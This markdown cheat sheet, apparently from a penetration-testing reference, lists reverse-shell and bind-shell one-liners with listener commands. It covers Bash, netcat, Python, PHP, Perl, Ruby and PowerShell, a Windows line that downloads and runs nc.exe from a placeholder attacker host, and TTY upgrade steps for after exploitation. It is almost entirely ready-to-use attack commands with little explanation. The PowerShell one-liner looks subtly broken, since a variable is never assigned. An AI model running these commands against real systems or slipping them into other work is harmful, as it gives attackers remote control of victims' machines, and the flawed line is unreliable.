---
title: "Reverse Shells"
description: "Common reverse shell one-liners and listener configurations"
---

A reference list of common one-liners used to establish reverse shells in various environments.

### Listeners

| **Command** | **Description** |
| :--- | :--- |
| `nc -lvnp <port>` | Netcat TCP listener (Listen, Verbose, Numeric-only IPs, Port) |
| `nc -lvnp <port> -e /bin/bash` | Netcat listener that binds a shell on connection (Bind Shell) |
| `socat TCP-LISTEN:<port>,reuseaddr FILE:`tty`,raw,echo=0` | Socat listener for fully interactive TTY shell |
| `rlwrap nc -lvnp <port>` | Netcat listener wrapped with rlwrap (provides history and arrow keys) |

### Unix / Linux One-Liners

#### Bash

```bash
# Classic Bash reverse shell (TCP)
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Bash reverse shell (Alternate syntax)
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
```

#### Netcat

```bash
# Netcat with -e option (OpenBSD/Traditional)
nc <IP> <PORT> -e /bin/bash
nc <IP> <PORT> -e /bin/sh

# Netcat without -e option (FIFO/Named Pipe method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

#### Python

```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

#### PHP

```php
# PHP reverse shell executing via system/exec
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP reverse shell using popen
php -r '$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

#### Perl

```perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec(sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f))'
```

### Windows One-Liners

#### PowerShell

```powershell
# PowerShell reverse shell (One-liner TCP client)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### cmd.exe via PowerShell Download & Execute

```cmd
# Download and execute an executable (e.g. nc.exe or a compiled payload)
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/nc.exe' -OutFile 'C:\Windows\Temp\nc.exe'"; C:\Windows\Temp\nc.exe <IP> <PORT> -e cmd.exe
```

### TTY Shell Upgrades (Post-Exploitation)

Once a shell is established, run the following to upgrade to a fully interactive TTY:

```bash
# Step 1: Spawn bash using Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
Ctrl+Z

# Step 3: Configure local terminal settings and foreground the shell
stty raw -echo; fg

# Step 4: Reset terminal settings (inside the shell)
reset

# Step 5: Export terminal variables
export SHELL=bash
export TERM=xterm-256color

# Step 6: Adjust screen rows/columns to fit local window
stty rows <rows> cols <columns>
```
